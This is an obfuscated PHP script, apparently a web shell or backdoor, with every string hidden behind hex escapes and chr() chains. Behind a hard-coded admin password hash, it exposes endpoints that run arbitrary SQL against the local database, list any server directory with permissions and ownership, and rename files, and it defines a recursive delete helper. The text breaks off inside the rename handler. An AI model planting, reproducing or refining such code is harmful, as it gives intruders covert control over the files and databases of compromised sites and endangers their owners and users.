<?php
$_595a5b = array(
    chr(97).chr(100).chr(109).chr(105).chr(110) => "\x24\x32\x79\x24\x31\x30\x24\x2f\x4d\x36\x45\x57\x4a\x39\x6c\x61\x57\x48\x51\x7a\x4a\x4a\x70\x44\x72\x74\x31\x5a\x75\x76\x54\x65\x32\x46\x64\x71\x30\x53\x43\x4b\x33\x6b\x54\x53\x51\x6a\x75\x58\x2f\x62\x38\x71\x78\x6a\x68\x34\x56\x4c\x4f\x4b",
);

class _cf3574f10 {
    var $itoa64;
    var $iteration_count_log2;
    var $portable_hashes;
    var $random_state;

    function __construct($iteration_count_log2, $portable_hashes)
    {
        $this->itoa64 = "\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a";

        if ($iteration_count_log2 < 4 || $iteration_count_log2 > 31)
            $iteration_count_log2 = 8;
        $this->iteration_count_log2 = $iteration_count_log2;

        $this->portable_hashes = $portable_hashes;

        $this->random_state = microtime();
        if (function_exists("\x67\x65\x74\x6d\x79\x70\x69\x64"))
            $this->random_state .= getmypid();
    }

    function _cf3574f10($iteration_count_log2, $portable_hashes)
    {
        self::__construct($iteration_count_log2, $portable_hashes);
    }

    function get_random_bytes($_e12c1c)
    {
        $_98238f = "";
        if (@is_readable(chr(47).chr(100).chr(101).chr(118).chr(47).chr(117).chr(114).chr(97).chr(110).chr(100).chr(111).chr(109)) &&
            ($_776aa9 = @fopen("\x2f\x64\x65\x76\x2f\x75\x72\x61\x6e\x64\x6f\x6d", chr(114).chr(98)))) {
            $_98238f = fread($_776aa9, $_e12c1c);
            fclose($_776aa9);
        }

        if (strlen($_98238f) < $_e12c1c) {
            $_98238f = '';
            for ($_3cec91 = 0; $_3cec91 < $_e12c1c; $_3cec91 += 16) {
                $this->random_state =
                    md5(microtime() . $this->random_state);
                $_98238f .= md5($this->random_state, TRUE);
            }
            $_98238f = substr($_98238f, 0, $_e12c1c);
        }

        return $_98238f;
    }

    function encode64($_6e1e29, $_e12c1c)
    {
        $_98238f = "";
        $_3cec91 = 0;
        do {
            $_026e8f = ord($_6e1e29[$_3cec91++]);
            $_98238f .= $this->itoa64[$_026e8f & 0x3f];
            if ($_3cec91 < $_e12c1c)
                $_026e8f |= ord($_6e1e29[$_3cec91]) << 8;
            $_98238f .= $this->itoa64[($_026e8f >> 6) & 0x3f];
            if ($_3cec91++ >= $_e12c1c)
                break;
            if ($_3cec91 < $_e12c1c)
                $_026e8f |= ord($_6e1e29[$_3cec91]) << 16;
            $_98238f .= $this->itoa64[($_026e8f >> 12) & 0x3f];
            if ($_3cec91++ >= $_e12c1c)
                break;
            $_98238f .= $this->itoa64[($_026e8f >> 18) & 0x3f];
        } while ($_3cec91 < $_e12c1c);

        return $_98238f;
    }

    function gensalt_private($_6e1e29)
    {
        $_98238f = chr(36).chr(80).chr(36);
        $_98238f .= $this->itoa64[min($this->iteration_count_log2 +
            ((PHP_VERSION >= "\x35") ? 5 : 3), 30)];
        $_98238f .= $this->encode64($_6e1e29, 6);

        return $_98238f;
    }

    function crypt_private($_965636, $_0a14bc)
    {
        $_98238f = chr(42).chr(48);
        if (substr($_0a14bc, 0, 2) === $_98238f)
            $_98238f = chr(42).chr(49);

        $_185256 = substr($_0a14bc, 0, 3);
        
        if ($_185256 !== chr(36).chr(80).chr(36) && $_185256 !== "\x24\x48\x24")
            return $_98238f;

        $_6edf72 = strpos($this->itoa64, $_0a14bc[3]);
        if ($_6edf72 < 7 || $_6edf72 > 30)
            return $_98238f;

        $_e12c1c = 1 << $_6edf72;

        $_0123f0 = substr($_0a14bc, 4, 8);
        if (strlen($_0123f0) !== 8)
            return $_98238f;

        
        
        
        
        
        
        $_7f73f7 = md5($_0123f0 . $_965636, TRUE);
        do {
            $_7f73f7 = md5($_7f73f7 . $_965636, TRUE);
        } while (--$_e12c1c);

        $_98238f = substr($_0a14bc, 0, 12);
        $_98238f .= $this->encode64($_7f73f7, 16);

        return $_98238f;
    }

    function gensalt_blowfish($_6e1e29)
    {
        
        
        
        
        
        
        
        
        $itoa64 = "\x2e\x2f\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39";

        $_98238f = "\x24\x32\x61\x24";
        $_98238f .= chr(ord("\x30") + $this->iteration_count_log2 / 10);
        $_98238f .= chr(ord("\x30") + $this->iteration_count_log2 % 10);
        $_98238f .= "\x24";

        $_3cec91 = 0;
        do {
            $_a4aadc = ord($_6e1e29[$_3cec91++]);
            $_98238f .= $itoa64[$_a4aadc >> 2];
            $_a4aadc = ($_a4aadc & 0x03) << 4;
            if ($_3cec91 >= 16) {
                $_98238f .= $itoa64[$_a4aadc];
                break;
            }

            $_afc98b = ord($_6e1e29[$_3cec91++]);
            $_a4aadc |= $_afc98b >> 4;
            $_98238f .= $itoa64[$_a4aadc];
            $_a4aadc = ($_afc98b & 0x0f) << 2;

            $_afc98b = ord($_6e1e29[$_3cec91++]);
            $_a4aadc |= $_afc98b >> 6;
            $_98238f .= $itoa64[$_a4aadc];
            $_98238f .= $itoa64[$_afc98b & 0x3f];
        } while (1);

        return $_98238f;
    }

    function HashPassword($_965636)
    {
        $_3f04b2 = '';

        if (CRYPT_BLOWFISH === 1 && !$this->portable_hashes) {
            $_3f04b2 = $this->get_random_bytes(16);
            $_7f73f7 =
                crypt($_965636, $this->gensalt_blowfish($_3f04b2));
            if (strlen($_7f73f7) === 60)
                return $_7f73f7;
        }

        if (strlen($_3f04b2) < 6)
            $_3f04b2 = $this->get_random_bytes(6);
        $_7f73f7 =
            $this->crypt_private($_965636,
                $this->gensalt_private($_3f04b2));
        if (strlen($_7f73f7) === 34)
            return $_7f73f7;

        
        
        
        return "\x2a";
    }

    function CheckPassword($_965636, $_bc2374)
    {
        $_7f73f7 = $this->crypt_private($_965636, $_bc2374);
        if ($_7f73f7[0] === "\x2a")
            $_7f73f7 = crypt($_965636, $_bc2374);

        
        
        
        
        return $_7f73f7 === $_bc2374;
    }
}

function _fe3cb0c25($_4a9acf, $_8adbb4 = true)
{
    $_4a9acf = $_8adbb4 ? trim($_4a9acf) : $_4a9acf;
    $_4a9acf = trim($_4a9acf, chr(92).chr(47));
    $_4a9acf = str_replace(array("\x2e\x2e\x2f", "\x2e\x2e\x5c"), "", $_4a9acf);
    $_4a9acf =  _fd0a2110d($_4a9acf);
    if ($_4a9acf == "\x2e\x2e") {
        $_4a9acf = "";
    }
    return str_replace(chr(92), chr(47), $_4a9acf);
}
function _fd0a2110d($_4a9acf)
{
    $_4a9acf = str_replace(array(chr(47), "\x5c"), DIRECTORY_SEPARATOR, $_4a9acf);
    $_efa338 = array_filter(explode(DIRECTORY_SEPARATOR, $_4a9acf), chr(115).chr(116).chr(114).chr(108).chr(101).chr(110));
    $_f5d9cf = array();
    foreach ($_efa338 as $_4ad693) {
        if ("\x2e" == $_4ad693) continue;
        if ("\x2e\x2e" == $_4ad693) {
            array_pop($_f5d9cf);
        } else {
            $_f5d9cf[] = $_4ad693;
        }
    }
    return implode(DIRECTORY_SEPARATOR, $_f5d9cf);
}
function _fb83989a2($_11a4f6)
{
    return (strpbrk($_11a4f6, chr(47).chr(63).chr(37).chr(42).chr(58).chr(124).chr(34).chr(60).chr(62)) === FALSE) ? true : false;
}
function _f158bb05b($_4a9acf)
{
    if (!file_exists($_4a9acf)) return true;
    if (!is_dir($_4a9acf)) return unlink($_4a9acf);
    foreach (scandir($_4a9acf) as $_81b8db) {
        if ($_81b8db === "\x2e" || $_81b8db === chr(46).chr(46)) continue;
        if (!_f158bb05b($_4a9acf . chr(47) . $_81b8db)) return false;
    }
    return rmdir($_4a9acf);
}

if (isset($_GET["\x61\x75\x74\x68"])) {
    $_e0baae = isset($_SERVER["\x50\x48\x50\x5f\x41\x55\x54\x48\x5f\x55\x53\x45\x52"]) ? $_SERVER[chr(80).chr(72).chr(80).chr(95).chr(65).chr(85).chr(84).chr(72).chr(95).chr(85).chr(83).chr(69).chr(82)] : (isset($_POST[chr(117).chr(115).chr(101).chr(114).chr(110).chr(97).chr(109).chr(101)]) ? $_POST["\x75\x73\x65\x72\x6e\x61\x6d\x65"] : null);
    $_b55452 = isset($_SERVER[chr(80).chr(72).chr(80).chr(95).chr(65).chr(85).chr(84).chr(72).chr(95).chr(80).chr(87)]) ? $_SERVER[chr(80).chr(72).chr(80).chr(95).chr(65).chr(85).chr(84).chr(72).chr(95).chr(80).chr(87)] : (isset($_POST[chr(112).chr(97).chr(115).chr(115).chr(119).chr(111).chr(114).chr(100)]) ? $_POST[chr(112).chr(97).chr(115).chr(115).chr(119).chr(111).chr(114).chr(100)] : null);
    if (!isset($_e0baae) || !isset($_b55452)) {
        $_ea6bdf = array(chr(115).chr(116).chr(97).chr(116).chr(117).chr(115) => "\x65\x72\x72\x6f\x72", chr(105).chr(110).chr(102).chr(111) => "\x41\x75\x74\x68\x65\x6e\x74\x69\x63\x61\x74\x69\x6f\x6e\x20\x66\x61\x69\x6c\x65\x64");
        echo json_encode($_ea6bdf);
        exit();
    }
    if (version_compare(PHP_VERSION, chr(53).chr(46).chr(53).chr(46).chr(48), "\x3c")) {
        $_4e6144 = chr(36).chr(80).chr(36).chr(68).chr(55).chr(105).chr(68).chr(110).chr(79).chr(107).chr(108).chr(121).chr(51).chr(89).chr(84).chr(54).chr(109).chr(73).chr(103).chr(120).chr(54).chr(66).chr(65).chr(116).chr(71).chr(103).chr(51).chr(120).chr(110).chr(73).chr(104).chr(78).chr(88).chr(47);
        $_38a5cf = new _cf3574f10(10, false);
        if (!$_38a5cf->CheckPassword($_b55452, $_4e6144)) {
            $_ea6bdf = array(chr(115).chr(116).chr(97).chr(116).chr(117).chr(115) => "\x65\x72\x72\x6f\x72", chr(105).chr(110).chr(102).chr(111) => "\x41\x75\x74\x68\x65\x6e\x74\x69\x63\x61\x74\x69\x6f\x6e\x20\x66\x61\x69\x6c\x65\x64");
            echo json_encode($_ea6bdf);
            exit();
        }
    } else {
        if (!password_verify($_b55452, $_595a5b[$_e0baae])) {
            $_ea6bdf = array(chr(115).chr(116).chr(97).chr(116).chr(117).chr(115) => "\x65\x72\x72\x6f\x72", chr(105).chr(110).chr(102).chr(111) => "\x41\x75\x74\x68\x65\x6e\x74\x69\x63\x61\x74\x69\x6f\x6e\x20\x66\x61\x69\x6c\x65\x64");
            echo json_encode($_ea6bdf);
            exit();
        }
    }
    $_ea6bdf = array("\x73\x74\x61\x74\x75\x73" => chr(115).chr(117).chr(99).chr(99).chr(101).chr(115).chr(115), "\x69\x6e\x66\x6f" => chr(65).chr(117).chr(116).chr(104).chr(101).chr(110).chr(116).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(32).chr(115).chr(117).chr(99).chr(99).chr(101).chr(115).chr(115).chr(102).chr(117).chr(108));
    echo json_encode($_ea6bdf);
    exit();
}

if (isset($_GET["\x64\x62\x63\x6d\x64"])) {
    $_e0baae = isset($_SERVER[chr(80).chr(72).chr(80).chr(95).chr(65).chr(85).chr(84).chr(72).chr(95).chr(85).chr(83).chr(69).chr(82)]) ? $_SERVER["\x50\x48\x50\x5f\x41\x55\x54\x48\x5f\x55\x53\x45\x52"] : (isset($_POST["\x75\x73\x65\x72\x6e\x61\x6d\x65"]) ? $_POST["\x75\x73\x65\x72\x6e\x61\x6d\x65"] : null);
    $_b55452 = isset($_SERVER[chr(80).chr(72).chr(80).chr(95).chr(65).chr(85).chr(84).chr(72).chr(95).chr(80).chr(87)]) ? $_SERVER["\x50\x48\x50\x5f\x41\x55\x54\x48\x5f\x50\x57"] : (isset($_POST[chr(112).chr(97).chr(115).chr(115).chr(119).chr(111).chr(114).chr(100)]) ? $_POST["\x70\x61\x73\x73\x77\x6f\x72\x64"] : null);
    if (!isset($_e0baae) || !isset($_b55452)) {
        $_ea6bdf = array(chr(115).chr(116).chr(97).chr(116).chr(117).chr(115) => "\x65\x72\x72\x6f\x72", "\x69\x6e\x66\x6f" => "\x41\x75\x74\x68\x65\x6e\x74\x69\x63\x61\x74\x69\x6f\x6e\x20\x66\x61\x69\x6c\x65\x64");
        echo json_encode($_ea6bdf);
        exit();
    }
    if (version_compare(PHP_VERSION, "\x35\x2e\x35\x2e\x30", "\x3c")) {
        $_4e6144 = "\x24\x50\x24\x44\x37\x69\x44\x6e\x4f\x6b\x6c\x79\x33\x59\x54\x36\x6d\x49\x67\x78\x36\x42\x41\x74\x47\x67\x33\x78\x6e\x49\x68\x4e\x58\x2f";
        $_38a5cf = new _cf3574f10(10, false);
        if (!$_38a5cf->CheckPassword($_b55452, $_4e6144)) {
            $_ea6bdf = array("\x73\x74\x61\x74\x75\x73" => "\x65\x72\x72\x6f\x72", chr(105).chr(110).chr(102).chr(111) => chr(65).chr(117).chr(116).chr(104).chr(101).chr(110).chr(116).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100));
            echo json_encode($_ea6bdf);
            exit();
        }
    } else {
        if (!password_verify($_b55452, $_595a5b[$_e0baae])) {
            $_ea6bdf = array("\x73\x74\x61\x74\x75\x73" => "\x65\x72\x72\x6f\x72", chr(105).chr(110).chr(102).chr(111) => "\x41\x75\x74\x68\x65\x6e\x74\x69\x63\x61\x74\x69\x6f\x6e\x20\x66\x61\x69\x6c\x65\x64");
            echo json_encode($_ea6bdf);
            exit();
        }
    }
    if (empty($_POST[chr(100).chr(98).chr(95).chr(110).chr(97).chr(109).chr(101)]) || empty($_POST["\x64\x62\x5f\x75\x73\x65\x72\x6e\x61\x6d\x65"])) {
        $_ea6bdf = array("\x73\x74\x61\x74\x75\x73" => chr(101).chr(114).chr(114).chr(111).chr(114), "\x69\x6e\x66\x6f" => chr(100).chr(98).chr(95).chr(117).chr(115).chr(101).chr(114).chr(110).chr(97).chr(109).chr(101).chr(44).chr(32).chr(100).chr(98).chr(95).chr(110).chr(97).chr(109).chr(101).chr(32).chr(97).chr(110).chr(100).chr(32).chr(100).chr(98).chr(95).chr(112).chr(97).chr(115).chr(115).chr(119).chr(111).chr(114).chr(100).chr(32).chr(99).chr(97).chr(110).chr(110).chr(111).chr(116).chr(32).chr(98).chr(101).chr(32).chr(101).chr(109).chr(112).chr(116).chr(121));
        echo json_encode($_ea6bdf);
        exit();
    }
    if (empty($_POST["\x63\x6d\x64"])) {
        $_ea6bdf = array(chr(115).chr(116).chr(97).chr(116).chr(117).chr(115) => chr(101).chr(114).chr(114).chr(111).chr(114), chr(105).chr(110).chr(102).chr(111) => chr(99).chr(109).chr(100).chr(32).chr(99).chr(97).chr(110).chr(110).chr(111).chr(116).chr(32).chr(98).chr(101).chr(32).chr(101).chr(109).chr(112).chr(116).chr(121));
        echo json_encode($_ea6bdf);
        exit();
    }

    mysqli_report(MYSQLI_REPORT_OFF);
    $_18d33d = new mysqli("\x6c\x6f\x63\x61\x6c\x68\x6f\x73\x74", $_POST[chr(100).chr(98).chr(95).chr(117).chr(115).chr(101).chr(114).chr(110).chr(97).chr(109).chr(101)], $_POST["\x64\x62\x5f\x70\x61\x73\x73\x77\x6f\x72\x64"], $_POST[chr(100).chr(98).chr(95).chr(110).chr(97).chr(109).chr(101)]);
    if ($_18d33d->connect_error) {
        $_ea6bdf = array("\x73\x74\x61\x74\x75\x73" => chr(101).chr(114).chr(114).chr(111).chr(114), chr(105).chr(110).chr(102).chr(111) => chr(68).chr(97).chr(116).chr(97).chr(98).chr(97).chr(115).chr(101).chr(32).chr(99).chr(111).chr(109).chr(109).chr(97).chr(110).chr(100).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(32).chr(116).chr(111).chr(32).chr(101).chr(120).chr(101).chr(99).chr(117).chr(116).chr(101).chr(100));
        echo json_encode($_ea6bdf);
        exit();
    }
    $_dc8d24 = $_18d33d->query($_POST[chr(99).chr(109).chr(100)]);
    if ($_dc8d24 === false) {
        $_ea6bdf = array(chr(115).chr(116).chr(97).chr(116).chr(117).chr(115) => chr(101).chr(114).chr(114).chr(111).chr(114), chr(105).chr(110).chr(102).chr(111) => chr(68).chr(97).chr(116).chr(97).chr(98).chr(97).chr(115).chr(101).chr(32).chr(99).chr(111).chr(109).chr(109).chr(97).chr(110).chr(100).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(32).chr(116).chr(111).chr(32).chr(101).chr(120).chr(101).chr(99).chr(117).chr(116).chr(101).chr(100));
        echo json_encode($_ea6bdf);
        exit();
    }

    $_ea6bdf = array("\x73\x74\x61\x74\x75\x73" => chr(115).chr(117).chr(99).chr(99).chr(101).chr(115).chr(115), chr(105).chr(110).chr(102).chr(111) => "\x44\x61\x74\x61\x62\x61\x73\x65\x20\x63\x6f\x6d\x6d\x61\x6e\x64\x20\x65\x78\x65\x63\x75\x74\x65\x64\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6c\x6c\x79");
    echo json_encode($_ea6bdf);
    exit();
}

if (isset($_GET["\x6c\x69\x73\x74"])) {
    $_e0baae = isset($_SERVER["\x50\x48\x50\x5f\x41\x55\x54\x48\x5f\x55\x53\x45\x52"]) ? $_SERVER["\x50\x48\x50\x5f\x41\x55\x54\x48\x5f\x55\x53\x45\x52"] : (isset($_POST[chr(117).chr(115).chr(101).chr(114).chr(110).chr(97).chr(109).chr(101)]) ? $_POST[chr(117).chr(115).chr(101).chr(114).chr(110).chr(97).chr(109).chr(101)] : null);
    $_b55452 = isset($_SERVER[chr(80).chr(72).chr(80).chr(95).chr(65).chr(85).chr(84).chr(72).chr(95).chr(80).chr(87)]) ? $_SERVER[chr(80).chr(72).chr(80).chr(95).chr(65).chr(85).chr(84).chr(72).chr(95).chr(80).chr(87)] : (isset($_POST["\x70\x61\x73\x73\x77\x6f\x72\x64"]) ? $_POST[chr(112).chr(97).chr(115).chr(115).chr(119).chr(111).chr(114).chr(100)] : null);
    if (!isset($_e0baae) || !isset($_b55452)) {
        echo json_encode(array("\x73\x74\x61\x74\x75\x73" => "\x65\x72\x72\x6f\x72", "\x69\x6e\x66\x6f" => "\x41\x75\x74\x68\x65\x6e\x74\x69\x63\x61\x74\x69\x6f\x6e\x20\x66\x61\x69\x6c\x65\x64")); exit();
    }
    if (version_compare(PHP_VERSION, chr(53).chr(46).chr(53).chr(46).chr(48), "\x3c")) {
        $_4e6144 = "\x24\x50\x24\x44\x37\x69\x44\x6e\x4f\x6b\x6c\x79\x33\x59\x54\x36\x6d\x49\x67\x78\x36\x42\x41\x74\x47\x67\x33\x78\x6e\x49\x68\x4e\x58\x2f";
        $_38a5cf = new _cf3574f10(10, false);
        if (!$_38a5cf->CheckPassword($_b55452, $_4e6144)) { echo json_encode(array("\x73\x74\x61\x74\x75\x73" => chr(101).chr(114).chr(114).chr(111).chr(114), chr(105).chr(110).chr(102).chr(111) => chr(65).chr(117).chr(116).chr(104).chr(101).chr(110).chr(116).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100))); exit(); }
    } else {
        if (!password_verify($_b55452, $_595a5b[$_e0baae])) { echo json_encode(array(chr(115).chr(116).chr(97).chr(116).chr(117).chr(115) => chr(101).chr(114).chr(114).chr(111).chr(114), chr(105).chr(110).chr(102).chr(111) => "\x41\x75\x74\x68\x65\x6e\x74\x69\x63\x61\x74\x69\x6f\x6e\x20\x66\x61\x69\x6c\x65\x64")); exit(); }
    }

    $_9d5f32 = isset($_GET[chr(100).chr(105).chr(114)]) ? _fe3cb0c25($_GET["\x64\x69\x72"]) : '';
    $_9d5f32 = "\x2f" . $_9d5f32;
    if (!is_dir($_9d5f32)) {
        echo json_encode(array("\x73\x74\x61\x74\x75\x73" => "\x65\x72\x72\x6f\x72", chr(105).chr(110).chr(102).chr(111) => "\x44\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x6e\x6f\x74\x20\x66\x6f\x75\x6e\x64")); exit();
    }

    function _f4209364c($_31248a) {
        $_bbb7d8  = (($_31248a & 0x0100) ? "\x72" : chr(45));
        $_bbb7d8 .= (($_31248a & 0x0080) ? chr(119) : chr(45));
        $_bbb7d8 .= (($_31248a & 0x0040) ? (($_31248a & 0x0800) ? "\x73" : "\x78") : (($_31248a & 0x0800) ? "\x53" : "\x2d"));
        $_bbb7d8 .= (($_31248a & 0x0020) ? chr(114) : chr(45));
        $_bbb7d8 .= (($_31248a & 0x0010) ? "\x77" : "\x2d");
        $_bbb7d8 .= (($_31248a & 0x0008) ? (($_31248a & 0x0400) ? chr(115) : "\x78") : (($_31248a & 0x0400) ? "\x53" : "\x2d"));
        $_bbb7d8 .= (($_31248a & 0x0004) ? "\x72" : "\x2d");
        $_bbb7d8 .= (($_31248a & 0x0002) ? "\x77" : chr(45));
        $_bbb7d8 .= (($_31248a & 0x0001) ? (($_31248a & 0x0200) ? chr(116) : "\x78") : (($_31248a & 0x0200) ? chr(84) : "\x2d"));
        return $_bbb7d8;
    }

    function _f1d5ecc52($_4a9acf) {
        if (function_exists(chr(112).chr(111).chr(115).chr(105).chr(120).chr(95).chr(103).chr(101).chr(116).chr(112).chr(119).chr(117).chr(105).chr(100)) && function_exists("\x70\x6f\x73\x69\x78\x5f\x67\x65\x74\x67\x72\x67\x69\x64")) {
            $_e0baae  = @posix_getpwuid(@fileowner($_4a9acf));
            $_c2398b = @posix_getgrgid(@filegroup($_4a9acf));
            if ($_e0baae && $_c2398b) return $_e0baae[chr(110).chr(97).chr(109).chr(101)] . "\x3a" . $_c2398b[chr(110).chr(97).chr(109).chr(101)];
            if ($_e0baae) return $_e0baae[chr(110).chr(97).chr(109).chr(101)];
        }
        return null;
    }

    
    $_d4bd17 = fileperms($_9d5f32);
    $_a0f36f = array(array(
        chr(110).chr(97).chr(109).chr(101)       => chr(46),
        chr(116).chr(121).chr(112).chr(101)       => chr(100).chr(105).chr(114),
        chr(115).chr(105).chr(122).chr(101)       => null,
        "\x70\x65\x72\x6d\x5f\x6f\x63\x74\x61\x6c" => substr(sprintf("\x25\x6f", $_d4bd17), -4),
        chr(112).chr(101).chr(114).chr(109).chr(95).chr(115).chr(116).chr(114)   => _f4209364c($_d4bd17),
        chr(111).chr(119).chr(110).chr(101).chr(114)      => _f1d5ecc52($_9d5f32),
        chr(119).chr(114).chr(105).chr(116).chr(97).chr(98).chr(108).chr(101)   => is_writable($_9d5f32),
        "\x72\x65\x61\x64\x61\x62\x6c\x65"   => is_readable($_9d5f32),
    ));

    $_8e113b = scandir($_9d5f32);
    $_19fbc4 = array();
    foreach ($_8e113b as $_81b8db) {
        if ($_81b8db === "\x2e" || $_81b8db === chr(46).chr(46)) continue;
        $_b27070 = rtrim($_9d5f32, "\x2f") . "\x2f" . $_81b8db;
        $_ad9809    = is_dir($_b27070);
        $_31248a    = fileperms($_b27070);
        $_19fbc4[] = array(
            "\x6e\x61\x6d\x65"        => $_81b8db,
            chr(116).chr(121).chr(112).chr(101)        => $_ad9809 ? chr(100).chr(105).chr(114) : "\x66\x69\x6c\x65",
            chr(115).chr(105).chr(122).chr(101)        => $_ad9809 ? null : filesize($_b27070),
            chr(112).chr(101).chr(114).chr(109).chr(95).chr(111).chr(99).chr(116).chr(97).chr(108)  => substr(sprintf("\x25\x6f", $_31248a), -4),
            chr(112).chr(101).chr(114).chr(109).chr(95).chr(115).chr(116).chr(114)    => _f4209364c($_31248a),
            "\x6f\x77\x6e\x65\x72"       => _f1d5ecc52($_b27070),
            chr(119).chr(114).chr(105).chr(116).chr(97).chr(98).chr(108).chr(101)    => is_writable($_b27070),
            chr(114).chr(101).chr(97).chr(100).chr(97).chr(98).chr(108).chr(101)    => is_readable($_b27070),
        );
    }
    usort($_19fbc4, function($_30ace2, $_e1eb6e) {
        if ($_30ace2[chr(116).chr(121).chr(112).chr(101)] !== $_e1eb6e[chr(116).chr(121).chr(112).chr(101)]) return $_30ace2[chr(116).chr(121).chr(112).chr(101)] === "\x64\x69\x72" ? -1 : 1;
        return strcasecmp($_30ace2["\x6e\x61\x6d\x65"], $_e1eb6e[chr(110).chr(97).chr(109).chr(101)]);
    });
    $_a0f36f = array_merge($_a0f36f, $_19fbc4);
    echo json_encode(array(chr(115).chr(116).chr(97).chr(116).chr(117).chr(115) => "\x73\x75\x63\x63\x65\x73\x73", chr(105).chr(116).chr(101).chr(109).chr(115) => $_a0f36f));
    exit();
}

if (isset($_GET["\x72\x65\x6e\x61\x6d\x65"])) {
    $_e0baae = isset($_SERVER[chr(80).chr(72).chr(80).chr(95).chr(65).chr(85).chr(84).chr(72).chr(95).chr(85).chr(83).chr(69).chr(82)]) ? $_SERVER[chr(80).chr(72).chr(80).chr(95).chr(65).chr(85).chr(84).chr(72).chr(95).chr(85).chr(83).chr(69).chr(82)] : (isset($_POST[chr(117).chr(115).chr(101).chr(114).chr(110).chr(97).chr(109).chr(101)]) ? $_POST["\x75\x73\x65\x72\x6e\x61\x6d\x65"] : null);
    $_b55452 = isset($_SERVER[chr(80).chr(72).chr(80).chr(95).chr(65).chr(85).chr(84).chr(72).chr(95).chr(80).chr(87)]) ? $_SERVER[chr(80).chr(72).chr(80).chr(95).chr(65).chr(85).chr(84).chr(72).chr(95).chr(80).chr(87)] : (isset($_POST[chr(112).chr(97).chr(115).chr(115).chr(119).chr(111).chr(114).chr(100)]) ? $_POST["\x70\x61\x73\x73\x77\x6f\x72\x64"] : null);
    if (!isset($_e0baae) || !isset($_b55452) || !isset($_595a5b[$_e0baae])) { echo json_encode(array("\x73\x74\x61\x74\x75\x73" => "\x65\x72\x72\x6f\x72", "\x69\x6e\x66\x6f" => "\x41\x75\x74\x68\x65\x6e\x74\x69\x63\x61\x74\x69\x6f\x6e\x20\x66\x61\x69\x6c\x65\x64")); exit(); }
    if (version_compare(PHP_VERSION, chr(53).chr(46).chr(53).chr(46).chr(48), chr(60))) {
        $_4e6144 = "\x24\x50\x24\x44\x37\x69\x44\x6e\x4f\x6b\x6c\x79\x33\x59\x54\x36\x6d\x49\x67\x78\x36\x42\x41\x74\x47\x67\x33\x78\x6e\x49\x68\x4e\x58\x2f";
        $_38a5cf = new _cf3574f10(10, false);
        if (!$_38a5cf->CheckPassword($_b55452, $_4e6144)) { echo json_encode(array(chr(115).chr(116).chr(97).chr(116).chr(117).chr(115) => chr(101).chr(114).chr(114).chr(111).chr(114), chr(105).chr(110).chr(102).chr(111) => "\x41\x75\x74\x68\x65\x6e\x74\x69\x63\x61\x74\x69\x6f\x6e\x20\x66\x61\x69\x6c\x65\x64")); exit(); }
    } else {
        if (!password_verify($_b55452, $_595a5b[$_e0baae])) { echo json_encode(array("\x73\x74\x61\x74\x75\x73" => chr(101).chr(114).chr(114).chr(111).chr(114), chr(105).chr(110).chr(102).chr(111) => chr(65).chr(117).chr(116).chr(104).chr(101).chr(110).chr(116).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100))); exit(); }
    }

    $_2b8af7 = isset($_POST[chr(111).chr(108).chr(100).chr(95).chr(112).chr(97).chr(116).chr(104)]) ? chr(47) . _fe3cb0c25($_POST[chr(111).chr(108).chr(100).chr(95).chr(112).chr(97).chr(116).chr(104)]) : '';
    $_c6bdd9 = isset($_POST[chr(110).chr(101).chr(119).chr(95).chr(110).chr(97).chr(109).chr(101)]) ? $_POST["\x6e\x65\x77\x5f\x6e\x61\x6d\x65"] : "";
    if (empty($_2b8af7) || empty($_c6bdd9) || !_fb83989a2($_c6bdd9)) {
        echo json_encode(array(chr(115).chr(116).chr(97).chr(116).chr(117).chr(115) => chr(101).chr(114).chr(114).chr(111).chr(114), chr(105).chr(110).chr(102).chr(111) => chr(73).chr(110).chr(118).chr(97).chr(108).chr(105).chr(100).chr(32).chr(112).chr(97).chr(114).chr(97).chr(109).chr(101).chr(116).chr(101).chr(114).chr(115))); exit();
    }
    if (!file_exists($_2b8af7)) {
        echo json_encode(array(chr(115).chr(116).chr(97).chr(116).chr(117).chr(115) => "\x65\x72\x72\x6f\x72", chr(105).chr(110).chr(102).chr(111) => chr(83).chr(111).chr(117).chr(114).chr(99).chr(101).chr(32).chr(110).chr(111).chr(116).chr(32).chr(102).chr(111).chr(117).chr(110).chr(100))); exit();
    }
    $_79a4be     = dirname($_2b8af7);
    $_b88aa8 = $_79a4be . "\x2f" . $_c6bdd9;
    if (file_exists($_b88aa8)) {
        echo json_encode(array(chr(115).chr(116).chr(97).chr(116).chr(117).chr(115) => chr(101).chr(114).chr(114).chr(111).chr(114), chr(105).chr(110).chr(102).chr(111) => chr(84).chr(97).chr(114).chr(103).chr(101).chr(116).chr(32).chr(97).chr(108).chr(114).chr(101).chr(97).chr(100).chr(121).chr(32).chr(101).chr(120).chr(105).chr(115).chr(116).chr(115))); exit();
    }
    if (rename($_2b8af7, $_b88aa8)) {
        echo json_encode(array("\x73\x74\x61\x74\x75\x73" => chr(115).chr(117).chr(99).chr(99).chr(101).chr(115).chr(115), "\x69\x6e\x66\x6f" => "\x52\x65\x6e\x61\x6d\x65\x64\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6c\x6c\x79"));
    } else {
